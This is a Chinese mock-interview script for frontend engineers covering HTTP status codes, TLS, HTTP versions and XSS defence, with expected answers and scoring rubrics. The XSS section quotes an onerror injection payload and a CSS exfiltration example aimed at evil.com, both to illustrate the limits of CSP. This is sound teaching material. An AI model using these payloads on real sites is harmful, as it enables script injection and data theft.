# 一面：网络 + 安全模拟面试（45 分钟）

> 适用对象：3 年中级前端工程师，技术栈 Vue3 + TypeScript
> 难度定位：覆盖 HTTP 协议栈 + 浏览器安全机制 + 缓存策略体系，全面考察网络基本功和安全意识

---

## 一、面试开场白（0-3 min）

### 面试官话术

> 面试官：你好，欢迎来参加今天的一面面试。我是今天的面试官，主要负责前端技术面的基础考察。接下来大约 45 分钟，我们主要围绕网络基础、浏览器安全和缓存策略来展开。如果你之前做过性能优化或者处理过安全相关的问题，可以随时结合项目经验来聊。放轻松，我们正式开始吧。
>
> 首先，请你做一个简单的自我介绍，大概 2-3 分钟。

### 面试官内心 OS（候选人自我介绍期间）

- 关注候选人表达是否流畅、逻辑是否清晰——网络和安全的术语是否用得准确（如"TLS 握手"而非"SSL 加密"、"CSP 策略"而非"安全头"），术语准确度直接反映专业程度。
- 留意候选人有没有提到性能优化或安全攻防的项目经历——如果有，这就是后续追问的切入点。如果候选人只说"用过 HTTPS"而没有更深的网络认知，说明这块需要多挖。
- 观察候选人对"从输入 URL 到页面渲染"这条链路有没有整体感——这是串联整个面试的主线。如果自我介绍里就体现出系统性思维，后续可以适当加深追问层次。
- 如果候选人提到"项目中遇到过网络问题"，记住具体场景（如跨域、慢接口、白屏），Q5/Q6/Q10 可以针对性地追问。

### 自我介绍后的过渡

> 面试官：好的，感谢你的介绍。那我们今天先从 HTTP 基础开始聊起，看看你对网络协议栈的理解深度。

## 三、第一阶段：HTTP 基础（3-15 min，3 题）

### Q1：HTTP 状态码（3-6 min）

#### 面试官话术

> 面试官：先来一个基础的——HTTP 状态码你了解哪些？随便说几个，按类别讲就行。

#### 面试官内心 OS

热身题。看候选人能不能按类（1xx-5xx）组织知识，而不是零散地报数字。这是一个区分"背过"和"理解"的题——背过的人说 200/301/302/404/500，理解的人说"1xx 信息，2xx 成功，3xx 重定向，4xx 客户端错误，5xx 服务端错误"。

更深一层的信号：候选人能不能给每个状态码关联一个实际场景？比如"304 是协商缓存命中时返回的"、"502 通常是 Nginx 反向代理时上游挂了"。能从场景出发而非死记数字的，说明工作中真正遇到过。

如果候选人主动提到 429（频率限制）、499（Nginx 客户端断开）这些非标状态码，说明运维意识不错——加分但不强求。

#### 考点

- 状态码 5 大分类 + 核心状态码的实际含义
- 常见状态码的业务场景关联（301 vs 302、401 vs 403、502 vs 504）
- 304 与缓存机制的联动理解

#### 预期回答

**初级**：能说出 200/301/302/304/400/401/403/404/500/502/503 中的 6 个以上，并基本讲对每个的含义。知道 200 成功、301/302 重定向、404 未找到、500 服务器错误——这已经覆盖日常开发中最常见的场景。但如果被问到"301 和 302 的区别"或"401 和 403 的区别"时卡住，说明只是用过而不是真正理解。

**中级**：按 5 类组织（1xx 信息、2xx 成功、3xx 重定向、4xx 客户端错误、5xx 服务端错误），能把每个分类下的核心状态码说清楚，并能准确区分易混淆的几对：

- **301 vs 302**：301 是永久重定向，浏览器会记住并下次直接跳转（搜索引擎会把权重转移到新 URL）；302 是临时重定向，每次都会重新请求原 URL。实际应用：域名迁移用 301，临时维护页用 302。
- **401 vs 403**：401 Unauthorized 是"未认证"——你还未登录或 token 过期，服务器不知道你是谁；403 Forbidden 是"无权限"——服务器知道你是谁但你没权限访问这个资源。场景：没登录访问 /admin 返回 401，普通用户访问管理员页面返回 403。
- **502 vs 504**：502 Bad Gateway 是网关错误——Nginx 收到上游服务器的无效响应（进程挂了、返回了格式异常的响应）；504 Gateway Timeout 是网关超时——上游服务器在规定时间内没有响应。

**高级**：在中级基础上，能够深入补充：

- **304 Not Modified** 和缓存的配合机制：当浏览器发起条件请求（带 `If-None-Match` 或 `If-Modified-Since`），服务器验证资源未改变时返回 304，告诉浏览器"用你本地的缓存版本"。这里的关键是 304 响应 body 为空，节省了传输带宽。Etag 优先级高于 Last-Modified——Etag 精确到内容级别，Last-Modified 只精确到秒。
- **206 Partial Content** 在断点续传和大文件分片下载中的作用：配合 `Range` 请求头（`Range: bytes=0-1023`），服务器返回文件的指定字节段。视频播放器拖拽进度条就是这个机制。
- **429 Too Many Requests**：频率限制，Nginx 和 API Gateway 常用。配合 `Retry-After` 响应头告诉客户端"多久之后可以再试"。实际项目中配合令牌桶/漏桶算法做限流。
- **499**（Nginx 特有）：客户端在服务器响应完成前主动断开连接。常见于用户快速关闭页面或前端设置了请求超时自动 abort。如果日志里 499 频繁出现，说明接口响应太慢——用户等不及就走了。

#### 评分标准

| 级别 | 标准 |
|------|------|
| 初级 | 能说出 6 个以上常见状态码及各自含义，知道 200/404/500 等基本场景，但无法按类别组织，对 301 vs 302、401 vs 403 区分不清 |
| 中级 | 按 5 类组织回答，能准确区分 301 vs 302（永久/临时）、401 vs 403（未认证/无权限）、502 vs 504（无效响应/超时），能结合 304 说明协商缓存的基本流程 |
| 高级 | 在中级基础上，能补充 206（断点续传）、429（频率限制）、499（客户端断开）等业务场景状态码，能深入解释 Etag 和 Last-Modified 的优先级关系，能从反向代理架构角度分析 502/504 的根因排查思路 |

#### 追问方向

**追问1**："304 状态码什么时候返回？Etag 和 Last-Modified 哪个优先级更高？为什么？"

> 预期回答：304 在协商缓存命中时返回——浏览器发起条件请求（带 `If-None-Match` 匹配 Etag 或 `If-Modified-Since` 匹配 Last-Modified），服务器判断资源未修改后返回 304，body 为空，浏览器使用本地缓存。Etag 优先级高于 Last-Modified，原因是：Etag 精确到文件内容级别（通常是内容的 hash 值），而 Last-Modified 只精确到秒——同一秒内多次修改检测不到。此外，Last-Modified 还有一个缺陷：定期生成的文件即使内容未变，修改时间也会更新。所以服务器实现上，`If-None-Match` 存在时会优先用它来校验，`If-Modified-Since` 作为兜底。

**追问2**："502 和 504 有什么区别？你在项目里排查过吗？"

> 预期回答：502 Bad Gateway 是上游服务器返回了无效响应——常见原因包括：应用进程崩溃或 OOM 被 kill、应用返回了不符合 HTTP 规范的响应、Nginx 和上游之间的 keepalive 连接超时后上游关闭了连接但 Nginx 还在复用。504 Gateway Timeout 是上游服务器在规定时间内没有返回任何响应——常见原因包括：慢查询、死锁、外部 API 调用超时、上游过载导致请求排队。排查思路：先看 Nginx 错误日志确认 502/504 的具体 upstream 地址和端口，再看应用日志中请求是否到达、是否报错、处理耗时多少。如果是间歇性 502，检查健康检查配置和进程存活状态。如果是规律性 504，检查 `proxy_read_timeout` 设置是否过短。

**追问3**："遇到过 429 吗？你们的限流策略是怎么做的？"

> 预期回答：429 Too Many Requests 表示请求频率超过限制。常见触发场景：短信验证码接口（60 秒内只能发 1 条）、登录接口（5 分钟内失败 5 次锁定）、API 对外接口（按 API Key 限制 QPS）。实现方式：服务端可以用令牌桶算法（允许突发但限制平均速率）或滑动窗口计数（统计最近 N 秒内的请求数）。Nginx 层可以用 `limit_req_zone` 模块做简单的漏桶限流。前端收到 429 后可以读取 `Retry-After` 响应头做倒计时重试提示。

#### 过渡语

> 面试官：状态码掌握得不错。那我们深入一层——用户访问一个 HTTPS 网站，安全性是怎么保证的？说说 TLS 握手。

### Q2：HTTPS 握手过程（6-10 min）

#### 面试官话术

> 面试官：用户访问一个 HTTPS 网站，从输入 URL 到安全连接的建立，这中间发生了什么？请你完整描述一下 TLS 握手的流程。如果有多个版本，也说说它们之间的区别。

#### 面试官内心 OS

这道题同时考"从输入 URL 到页面"的思路框架和 TLS 安全机制的深度。核心关注三个点：(1) 能不能把 TCP 三次握手和 TLS 握手区分清楚——很多候选人会混在一起讲，这说明对协议分层没有概念；(2) 能不能讲清楚非对称加密和对称加密的分工——为什么不全用非对称？性能差异是多大？这是区分"懂原理"和"背过程"的关键；(3) 知不知道 TLS 1.3 相比 1.2 简化了什么——如果候选人主动提到 1.3 的 1-RTT 和 0-RTT，说明关注协议演进。

如果候选人把"三次握手"和"TLS 握手"混为一谈，或者把 SSL 和 TLS 当成两个完全不同的东西来罗列而不是说"SSL 是 TLS 的前身，SSL 3.0 之后改名为 TLS 1.0"，说明网络基础偏薄弱。

#### 考点

- TCP 三次握手 + 四次挥手（基本理解即可，不要求逐包级）
- TLS 1.2 握手完整流程（双向证书校验可选）
- 非对称加密与对称加密的分工逻辑
- 证书链验证机制
- TLS 1.3 简化握手（1-RTT）与 0-RTT

#### 预期回答

**初级**：HTTPS = HTTP + SSL/TLS，数据加密传输，比 HTTP 安全。浏览器地址栏有锁图标表示使用了 HTTPS。知道证书需要从 CA 机构申请，服务器配置证书后用户访问时数据经过加密。但对于握手的具体步骤、为什么需要证书、对称和非对称加密的区别说不清楚。

**中级**：能完整描述 TLS 1.2 握手流程：

1. **Client Hello**：客户端发送支持的 TLS 版本、加密套件列表（cipher suites）、客户端随机数（Client Random）。
2. **Server Hello**：服务器选择 TLS 版本和加密套件，返回服务器随机数（Server Random）和证书（包含公钥）。
3. **客户端验证证书**：验证证书是否由受信任的 CA 签发、证书是否在有效期内、证书的域名是否匹配。通过后生成 Pre-Master Secret（预主密钥），用服务器公钥加密后发送给服务器。
4. **双方计算会话密钥**：客户端和服务器各自用 Client Random + Server Random + Pre-Master Secret 通过 PRF（伪随机函数）生成相同的 Master Secret，再派生为对称加密的会话密钥。
5. **完成握手**：双方发送 Finished 消息（用会话密钥加密），验证加密通信是否正常。

此后所有数据都用会话密钥进行对称加密传输。整个过程的精妙之处在于：非对称加密（RSA/ECDHE）只用于安全地交换 Pre-Master Secret，而真正的数据通信用对称加密（AES-GCM/ChaCha20）——因为非对称加密比对称加密慢 100-1000 倍。

**高级**：在中级基础上，能够深入扩展：

- **TLS 1.3 的改进**：将握手从 2-RTT 缩短到 1-RTT——移除了 RSA 密钥交换，只保留支持前向安全性（Forward Secrecy）的 ECDHE。Server Hello 之后服务器直接发送加密的证书和 Finished 消息，省去了 Change Cipher Spec 这一步。0-RTT 模式（通过 PSK 会话恢复）可以实现"零往返"——在第一次连接后，客户端可以用缓存的 PSK 在第一个包就携带加密的业务数据，但对重放攻击敏感，需要服务端额外防护。
- **证书链验证的完整过程**：浏览器内置了受信任的根 CA 证书列表（Root Store）。验证时从网站证书开始，逐级向上验证：网站证书由中间 CA 签发 -> 中间 CA 证书由根 CA 签发 -> 根 CA 证书在浏览器内置列表中。每一步验证签发者的数字签名、证书有效期、吊销状态（通过 CRL/OCSP）。任何一级验证失败，浏览器都会显示不安全警告。
- **前向安全性（Forward Secrecy）**：即使服务器的私钥泄露，过去通信的会话密钥也无法被解密——因为 ECDHE 模式下每次握手生成临时的密钥对，会话密钥不依赖长期私钥。RSA 密钥交换不具备前向安全性。
- **HTTP Strict Transport Security（HSTS）**：服务器可以通过 `Strict-Transport-Security` 响应头告诉浏览器"在指定时间内只通过 HTTPS 访问此站点"，防止中间人攻击中的 SSL 剥离。配合 `includeSubDomains` 和 `preload` 指令，浏览器在 DNS 解析之前就知道只能用 HTTPS。

#### 评分标准

| 级别 | 标准 |
|------|------|
| 初级 | 知道 HTTPS = HTTP + TLS 加密，知道证书由 CA 签发，但对于握手流程、对称/非对称加密的分工讲不清楚，可能把 TCP 三次握手和 TLS 握手混为一谈 |
| 中级 | 能完整描述 TLS 1.2 四步握手流程（Client Hello -> Server Hello+证书 -> 客户端验证+密钥交换 -> Finished），能解释为什么用非对称加密交换对称密钥（性能差距 100-1000 倍），知道证书链的基本验证逻辑 |
| 高级 | 在中级基础上，能对比 TLS 1.2 和 1.3 的核心差异（1-RTT/0-RTT、移除 RSA 密钥交换、只保留前向安全算法），能深入解释前向安全性的含义和应用场景，能讲出证书链从根到网站的逐级验证机制（Root CA -> Intermediate CA -> Server Cert），了解 OCSP Stapling 优化证书吊销检查性能 |

#### 追问方向

**追问1**："证书链是怎么验证的？如果中间 CA 被攻破了会怎样？"

> 预期回答：浏览器收到服务器证书后，会按证书链逐级向上验证：从服务器证书开始，检查签发者是否是某个中间 CA -> 中间 CA 的签发者是否是某个根 CA -> 根 CA 是否在浏览器内置的信任列表中。每一步都要验证：签发者的数字签名是否匹配、证书是否在有效期内、是否被吊销（通过 CRL 或 OCSP）。如果中间 CA 被攻破，攻击者可以用该中间 CA 的私钥签发任意域名的伪造证书，浏览器会将其视为合法证书——这就是历史上 DigiNotar（2011 年荷兰 CA 被入侵）导致的安全灾难。浏览器厂商的应对机制：(1) 在浏览器更新中直接吊销该 CA 的根证书；(2) Certificate Transparency（证书透明度）要求 CA 公开记录所有签发的证书，域名所有者可以监控是否有未授权的证书被签发；(3) HPKP（已弃用）曾允许网站自己指定哪些 CA 的证书才算有效。

**追问2**："为什么不全用非对称加密？对称加密和非对称加密的性能差异有多大？"

> 预期回答：非对称加密（RSA/ECDSA）比对称加密（AES-GCM/ChaCha20）慢 100-1000 倍，不适合加密全量数据。具体原因：(1) RSA 的加解密涉及大质数模幂运算，CPU 计算量巨大，而 AES 是位运算和查表操作，且有硬件加速指令（AES-NI）；(2) 非对称加密的密文长度通常比明文长（RSA 密钥 2048 位时每次最多加密 256 字节，还会膨胀），对称加密是流式加解密，大小几乎不变。因此 TLS 的设计是最优解：用非对称加密（或 ECDHE）只交换会话密钥，后续流量全部用对称加密——兼顾了安全初始化（证书体系）和持续加密的性能。

**追问3**："中间人攻击怎么做？HTTPS 怎么防御？"

> 预期回答：中间人攻击（MITM）的核心思路：攻击者插入到客户端和服务器之间的通信链路中，对客户端伪装成服务器，对服务器伪装成客户端，从而读取或篡改所有通信内容。常见方式：ARP 欺骗（局域网内）、DNS 劫持、伪造 Wi-Fi 热点。HTTPS 的三层防御：(1) 证书 + CA 体系——攻击者可以生成自签名证书但无法获得受信任 CA 签发的证书，浏览器会用根证书验证，发现不匹配时显示安全警告；(2) HSTS——网站可以强制浏览器只用 HTTPS，防止 SSL 剥离攻击；(3) Certificate Transparency——CA 公开所有签发证书的日志，域名所有者可以审计是否有异常证书。另外，**HTTPS 并非万能**——如果用户点击了"仍要访问"忽略证书警告，或者本地安装了不受信任的根证书（企业内网流量审计工具常这样做），中间人攻击仍然可能成功。

#### 过渡语

> 面试官：TLS 握手理解得不错。那我们把视野再拉大一点——HTTP 经历了几个大版本，1.1、2、3 之间最核心的差异是什么？为什么需要这些升级？

### Q3：HTTP1.1 vs HTTP2 vs HTTP3（10-15 min）

#### 面试官话术

> 面试官：HTTP 经历了几个大版本迭代，每个版本都解决了上一版的核心问题。请你从 1.1 开始，说说每个版本的最大痛点是什么，下一代又是怎么解决的。

#### 面试官内心 OS

这道题考察候选人对协议演进的关注度和"为什么需要升级"的底层思考能力——而不是仅仅背"HTTP2 多路复用"。核心信号：(1) 能不能讲清楚"队头阻塞"（Head-of-Line Blocking）——HTTP1.1 的连接级队头阻塞和 HTTP2 的 TCP 流级队头阻塞是两回事，能区分开的说明真的懂；(2) 知不知道 HTTP2 下不该做什么——比如不需要再合并文件/spriting 图片了，这是"学了新协议但还按老套路干活"的信号，能指出这个问题的候选人说明有实际应用的思考；(3) 知不知道 HTTP3 为什么用 QUIC/UDP 而不是继续在 TCP 上改进——这反映了对"协议栈瓶颈从应用层下移到传输层"的理解。

如果候选人只说"HTTP2 快"但说不出为什么快，追问"既然 HTTP2 多路复用了为什么还有队头阻塞？"——看能不能答出 TCP 的可靠传输特性导致的。

#### 考点

- HTTP 各版本的核心痛点和解决方案
- 队头阻塞（HOL Blocking）在不同版本中的表现
- HTTP2 多路复用、头部压缩（HPACK）、服务器推送
- HTTP3 基于 QUIC/UDP 的设计思路
- 各版本下前端工程化的策略变化

#### 预期回答

**初级**：HTTP1.1 支持持久连接（keep-alive），HTTP2 支持多路复用（一个连接上并发多个请求），HTTP3 基于 QUIC 更快。知道 HTTP2 比 1.1 快，HTTP3 比 HTTP2 更快，但说不出"为什么快"的技术细节。

**中级**：能系统性地对比三个版本：

| 特性 | HTTP1.1 | HTTP2 | HTTP3 |
|------|---------|-------|-------|
| 传输层 | TCP | TCP | QUIC（基于 UDP） |
| 连接复用 | 持久连接（keep-alive），但同一连接上请求串行 | 多路复用，一个连接上并发多个 Stream | 多路复用，且无 TCP 队头阻塞 |
| 头部处理 | 明文传输，每次请求都发完整头部 | HPACK 压缩，用索引表和哈夫曼编码压缩头部 | QPACK 压缩（解决 HPACK 在 TCP 上的队头阻塞） |
| 服务器推送 | 不支持 | 支持（已少用，Chrome 已移除） | 支持 |
| 加密 | 可选（HTTPS 时加密） | 事实上强制 TLS 1.2+ | 内置加密（TLS 1.3 集成到 QUIC 中） |

版本演进的逻辑链：HTTP1.1 的问题是同域只能开 6-8 个 TCP 连接，且每个连接上请求串行（队头阻塞），前端工程化上不得不做域名分片、文件合并、雪碧图来应对；HTTP2 用多路复用解决了应用层的队头阻塞，一个 TCP 连接上可以并发任意多个请求，之前那些"优化"反而变成了反模式；但 HTTP2 仍然基于 TCP，TCP 本身的可靠传输特性意味着——一个 TCP 包丢了，后续所有包都得等它重传（TCP 层面的队头阻塞），同一个连接上的所有 HTTP Stream 都会卡住；HTTP3 把传输层从 TCP 换成 QUIC（基于 UDP），QUIC 在每条流上独立管理丢包和重传，一条流的丢包不会阻塞其他流——彻底解决了传输层的队头阻塞。

**高级**：在中级基础上，能够深入展开：

- **TCP 队头阻塞的具体表现**：TCP 是面向字节流的可靠传输协议，接收方必须按序接收。假设发送了 TCP 包 1、2、3，包 2 丢失了，即使包 3 已经到达，操作系统也会把它暂存在内核缓冲区，等包 2 重传成功后才一起交给应用层。在 HTTP2 中，所有 Stream 复用一个 TCP 连接，一个 TCP 包的丢失会阻塞这个连接上的所有 Stream，不论它们之间有没有逻辑关系。这就是为什么 2% 的丢包率下 HTTP2 可能比 HTTP1.1 还慢——HTTP1.1 有多个 TCP 连接，一个连接卡住不影响其他连接。
- **QUIC 的设计要点**：(1) 0-RTT 建连——首次连接 1-RTT（不像 TCP+TLS 需要 1.5 + 1 = 2.5 RTT），重用连接时 0-RTT；(2) 连接迁移——由 Connection ID 而非 IP+端口四元组标识连接，Wi-Fi 切 4G 时连接不中断；(3) 前向纠错（FEC）可选——提前发送冗余包，减少等待重传的时间；(4) 每个 Stream 独立的流量控制和丢包恢复——Stream A 丢包不影响 Stream B。
- **HTTP2 服务器推送的问题与结局**：服务器推送的本意是"服务器预测客户端接下来需要什么资源提前推送过去"，如 HTML 解析到 `<link>` 时推送 CSS。但实际效果很差：(1) 推送的资源可能浏览器已经缓存了，浪费带宽；(2) 推送逻辑在服务器侧写起来复杂，团队很少去维护；(3) 推送的优先级不如浏览器自身的资源优先级算法准确。Chrome 106 正式移除了对 HTTP2 Server Push 的支持——建议用 `<link rel="preload">` 代替。
- **TPC/IP 与 OSI 模型的分层对齐**：OSI 七层模型（物理层 -> 数据链路层 -> 网络层 -> 传输层 -> 会话层 -> 表示层 -> 应用层）是理论模型，TCP/IP 四层模型（链路层 -> 网络层 -> 传输层 -> 应用层）是工程实践的简化。前端主要工作在应用层（HTTP/HTTPS），但理解 TCP（传输层）的队头阻塞和 QUIC 为何用 UDP 绕过 TCP，需要穿透一层去看。

#### 评分标准

| 级别 | 标准 |
|------|------|
| 初级 | 知道 HTTP2 多路复用比 1.1 快，知道 HTTP3 基于 QUIC/UDP，但对队头阻塞的具体机制和版本间差异解释不清，可能只说"更快"但说不出原因 |
| 中级 | 能系统对比三个版本的核心差异（HTTP/1.1 串行+连接限制 -> HTTP2 多路复用+头部压缩 -> HTTP3 QUIC+无 TCP HOL），能说明为什么 HTTP2 下不需要合并文件（多路复用让小文件并发加载更高效），知道 TCP 队头阻塞是 HTTP2 的遗留问题 |
| 高级 | 在中级基础上，能用丢包场景（2% 丢包率）解释 HTTP2 为何可能比 HTTP1.1 慢，能对比 QUIC 和 TCP 在丢包恢复/连接迁移/0-RTT 方面的差异，了解 HTTP2 Server Push 被 Chrome 移除的原因及用 preload 替代，能解释 OSI 七层和 TCP/IP 四层的分层对应关系和前端所处的应用层定位 |

#### 追问方向

**追问1**："HTTP2 的服务器推送有什么问题？为什么 Chrome 移除了它？更好的替代方案是什么？"

> 预期回答：服务器推送的问题：(1) 浪费带宽——推送的资源浏览器可能已有缓存，无法用条件请求验证（因为推送是"推"不是"拉"），导致重复传输；(2) 推送的逻辑依赖服务器预判，配置复杂且容易出错——比如只根据请求路径做简单规则（'请求 /index.html 就推 /style.css'），多页面应用中不精准；(3) 推送的资源抢占浏览器更有价值的请求（如渲染阻塞的 CSS vs 非首屏图片），服务器无法像浏览器那样准确知道当前渲染需要什么。Chrome 106+ 移除了对 HTTP2 Server Push 的支持。更好的替代方案：(1) `<link rel="preload">` 在 HTML 中声明关键资源的提前加载，浏览器自己控制优先级和缓存验证；(2) 103 Early Hints——服务器在返回 HTML 之前先返回 103 状态码 + Link 头，提示浏览器提前连接和预加载，效果相当于"温和的推送"，浏览器可以选择性执行。

**追问2**："HTTP2 下还需要做域名分片（domain sharding）、CSS Sprites、文件合并这些老优化吗？"

> 预期回答：不需要，而且反而有害。域名分片（把资源分布到多个域名如 static1.example.com ~ static4.example.com 来绕过 HTTP1.1 的同域 6 个连接限制）：在 HTTP2 下，多域名的代价是需要额外的 DNS 查询、TCP 连接和 TLS 握手，反而增加了建连开销。更好的做法是用 HTTP2 的单连接多路复用。CSS Sprites 和文件合并（把多个小 CSS/JS 合并为一个大文件减少请求数）：在 HTTP2 下，多路复用让多个小文件可以并发传输，合并反而降低了缓存粒度——改一行 CSS 就要让整个合并文件缓存失效。正确的策略是：文件保持细粒度（按组件/页面拆分），用文件名 hash 做长期强缓存，HTTP2 多路复用负责高效传输。

**追问3（加分题）**："HTTP3 用了 QUIC，QUIC 基于 UDP——那 QUIC 怎么保证可靠性？UDP 不是不可靠的吗？"

> 预期回答：QUIC 是在 UDP 之上实现了一套类 TCP 的可靠传输机制，并非直接使用裸 UDP。QUIC 在用户态实现了：(1) 确认与重传——每个数据包有唯一递增的包序号，接收方确认后发送 ACK，发送方超时未收到 ACK 则重传；(2) 流量控制——基于连接级别和 Stream 级别的滑动窗口；(3) 拥塞控制——类似 TCP 的 Cubic/BBR 算法；(4) 前向纠错（FEC）可选。QUIC 的优势在于：(1) 这些逻辑在用户态实现而非内核态，升级无需等待操作系统更新；(2) 多 Stream 独立状态——丢包只影响对应的 Stream，不影响其他；(3) 连接迁移——基于 64 位 Connection ID 而非 IP+端口，网络切换时连接不中断。

## 四、第二阶段：浏览器安全（15-27 min，3 题）

### Q4：XSS 攻击和防御（15-19 min）

#### 面试官话术

> 面试官：说说 XSS 是什么，它的攻击原理是怎样的？在你做过的项目里，你是怎么防的？

#### 面试官内心 OS

XSS 是面试中几乎是 100% 会被问到的安全问题——因为它和前端开发的日常编码（拼接 HTML、innerHTML、v-html）直接相关。核心看三点：(1) 能不能准确区分反射型/存储型/DOM 型这三种 XSS——很多候选人只说出"反射型和存储型"，漏掉 DOM 型，说明对浏览器端的 XSS 关注不够；(2) 防御措施能不能说出"多层纵深防御"的思路——输出转义（第一道防线）+ CSP（第二道防线）+ HttpOnly（第三道防线）+ 输入校验（辅助），而不是只背一个"转义 HTML 实体"；(3) 知不知道"语境感知的转义"——HTML body 里的转义（`<` -> `&lt;`）、属性值里的转义（引号闭合）、JS 字符串里的转义（`\x3C`）、URL 里的转义（`%3C`），各自需要不同的处理。

如果候选人说"我们用 React/Vue 就自动防 XSS 了"，要追问"那 v-html 和 dangerouslySetInnerHTML 呢？还有服务端渲染的 XSS 呢？"——看是否真的理解框架的边界。

#### 考点

- XSS 三种类型（反射型/存储型/DOM 型）的原理和区别
- 多层纵深防御体系（转义 + CSP + HttpOnly + 输入校验）
- 语境感知转义（HTML body / 属性 / JS / URL 各自不同）
- 前端框架的 XSS 防护边界和绕过方式

#### 预期回答

**初级**：XSS = 跨站脚本攻击，攻击者向页面注入恶意 `<script>` 代码，当其他用户访问该页面时恶意脚本执行，可以窃取 Cookie、重定向、篡改页面内容。防御：用户输入做 HTML 实体转义（`<` 转成 `&lt;`），用框架时不要用 `v-html`/`dangerouslySetInnerHTML` 直接渲染用户输入。

**中级**：能区分三种 XSS 并各自给出防御方案：

- **反射型 XSS**：恶意脚本在 URL 参数中，服务器直接反射到响应 HTML 里（如搜索关键词被拼到 `<p>搜索"{keyword}"的结果</p>` 中）。攻击者诱导用户点击特制链接（如钓鱼邮件），用户点击后脚本在当前域名下执行。防御：服务端对输出进行 HTML 上下文转义，不要直接拼接用户输入到 HTML 中。
- **存储型 XSS**：恶意脚本存储在服务器（数据库/文件），所有访问相关页面的用户都会中招。典型场景：论坛帖子的内容、用户昵称、商品评论。这是危害最大的一种——一次注入，所有访问者受影响。防御：数据入库前做输入校验和清洗（白名单过滤，而非黑名单），出库渲染时做输出转义。
- **DOM 型 XSS**：整个过程都在浏览器端完成，恶意数据不经过服务器。前端 JS 从 URL（`location.hash`、`location.search`）或 `document.referrer` 中读取参数，直接用 `innerHTML`/`document.write()` 渲染。防御：永远不要用 `innerHTML` 处理用户可控的数据，用 `textContent` 代替；避免使用 `eval`、`new Function`、`setTimeout(string)` 这些可以执行字符串代码的 API。

防御体系四道防线：(1) **输出转义**（第一道，最核心）——根据上下文选择转义方式；(2) **CSP**（第二道，兜底）——Content-Security-Policy 限制脚本来源，即使某处 XSS 漏了，CSP 也能阻止未知脚本执行；(3) **HttpOnly Cookie**——关键 Cookie（如 Session ID）设为 HttpOnly，即使 XSS 成功也无法通过 `document.cookie` 读取；(4) **输入校验**（辅助）——服务端对输入做长度限制、类型校验、白名单过滤。

**高级**：在中级基础上，能深入：

- **语境感知转义**：不同的 HTML 上下文需要不同的转义方式。HTML body 中：`<` -> `&lt;`, `>` -> `&gt;`, `&` -> `&amp;`。HTML 属性值中（单引号/双引号/无引号）：需要额外处理引号闭合攻击（如 `"` -> `&quot;`）。JavaScript 字符串中：不能用 HTML 实体转义，需要用 `\xHH` 十六进制或 `\uHHHH` Unicode 转义，并且要先做 JSON 序列化后再转义。URL 中：用 `encodeURIComponent` 或 `%HH` 编码。可以讲一个实战案例来说明语境的重要性——如果在一个 `onclick="..."` 属性里只做了 HTML 实体转义，攻击者可以用 `&#39;`（单引号的 HTML 实体）来绕过，因为浏览器在解析属性值时会先解码 HTML 实体再执行 JS。
- **CSP 的详细部署策略**：`Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}' 'strict-dynamic'; style-src 'self' 'unsafe-inline'; object-src 'none'; base-uri 'self';`。关键点：(1) nonce 必须是每次请求都生成唯一的随机值，否则攻击者可以预测；(2) `strict-dynamic` 允许带 nonce 的脚本动态创建其他脚本（如 webpack 动态加载），不需要列出所有 CDN；(3) `object-src 'none'` 屏蔽 Flash 和其他插件的攻击向量；(4) `base-uri 'self'` 防止 `<base>` 标签劫持相对路径。
- **前端框架的 XSS 边界**：Vue/React 的模板语法默认对 `{{ }}` 和 JSX 表达式做转义，但 `v-html` 和 `dangerouslySetInnerHTML` 是故意留的后门。DOM 型 XSS 仍然可能在框架代码中出现——比如 `ref.innerHtml = userInput` 或者在 Vue 的 `watch` 里直接操作 DOM。服务端渲染（SSR）场景下，如果服务端拼接了用户输入到 HTML 中返回，框架的客户端转义根本来不及——因为恶意脚本在一个完整的 HTML 中被直接返回到浏览器。

#### 评分标准

| 级别 | 标准 |
|------|------|
| 初级 | 知道 XSS 是注入恶意脚本攻击，能说出输出转义和 HttpOnly Cookie 两种防御措施，但无法区分三种 XSS 类型，对 CSP 不了解或只说"加个 CSP 头"但不会配 |
| 中级 | 能准确区分反射型/存储型/DOM 型 XSS 的攻击路径和各自防御重点，能描述四道防线（输出转义 + CSP + HttpOnly + 输入校验）的协作关系，知道 innerHTML 和 textContent 的安全性差异 |
| 高级 | 在中级基础上，能深入解释语境感知转义（HTML body/属性/JS 字符串/URL 各不同），能写出一份实际的 CSP 策略并解释 nonce/strict-dynamic/base-uri 的作用，知道框架（Vue/React）的 XSS 防护边界和 SSR 场景下的特殊风险，能给一个组合防御的实战案例 |

#### 追问方向

**追问1**："innerHTML 和 textContent 哪个安全？为什么？项目中怎么防止误用 innerHTML？"

> 预期回答：`textContent` 安全——浏览器会将其全部作为纯文本处理，不解析 HTML 标签。`innerHTML` 会把字符串当做 HTML 解析，`<script>` 标签会被执行（直接赋值时除外——HTML5 规范规定通过 innerHTML 插入的 script 不会执行，但 `<img src=x onerror=alert(1)>` 这类事件处理型注入会执行）。所以依赖"innerHTML 不执行 script"来防 XSS 是危险的——攻击者不需要 `<script>` 标签。防止误用的措施：(1) ESLint 规则 `no-unsanitized/property` 检测危险赋值；(2) Code Review 中重点关注 `innerHTML`、`v-html`、`dangerouslySetInnerHTML`、`document.write`；(3) 如果必须用 innerHTML 插入富文本，先用 DOMPurify 等成熟的 HTML 净化库做白名单过滤，过滤掉所有 script 标签、事件处理器（onerror/onload/onclick 等）、javascript: 协议 URL。

**追问2**："CSP 怎么配？nonce 和 hash 哪种方式更好？你的 CSP 能防住哪些攻击？"

> 预期回答：CSP 通过 `Content-Security-Policy` HTTP 响应头设置。核心指令：`default-src 'self'` 将所有资源的默认来源限制为同源；`script-src` 指定脚本合法来源。两种白名单方式：(1) hash——计算合法内联脚本内容的 SHA-256 hash，写入 CSP 头。优点是简单、无需服务端动态处理，缺点是脚本内容一变 hash 就要改。(2) nonce——服务端每次响应生成一个随机数（如 `nonce-r@nd0m`），同时在 `<script nonce="r@nd0m">` 标签和 CSP 头中写入相同值。优点是动态生成的脚本也能放行（如 webpack 的 inline chunk），缺点是每次都要动态生成，不能静态缓存。实践中：静态的 inline 脚本用 hash，动态生成的内联脚本用 nonce。`strict-dynamic` 可以让已经获得信任的脚本（通过 nonce/hash）去动态加载的其他脚本自动获得信任，不需要列出所有 CDN 白名单。CSP 防不住的攻击：(1) 基于 CSS 的数据泄露（CSS injection with `background-image: url(https://evil.com?data=...)`）；(2) 利用同源 JSONP 接口进行的注入（SOME 攻击），因为 JSONP 的 script 是同源的；(3) DOM clobbering 绕过。

**追问3**："你在项目中实际处理过 XSS 吗？你怎么验证防御措施是否到位？"

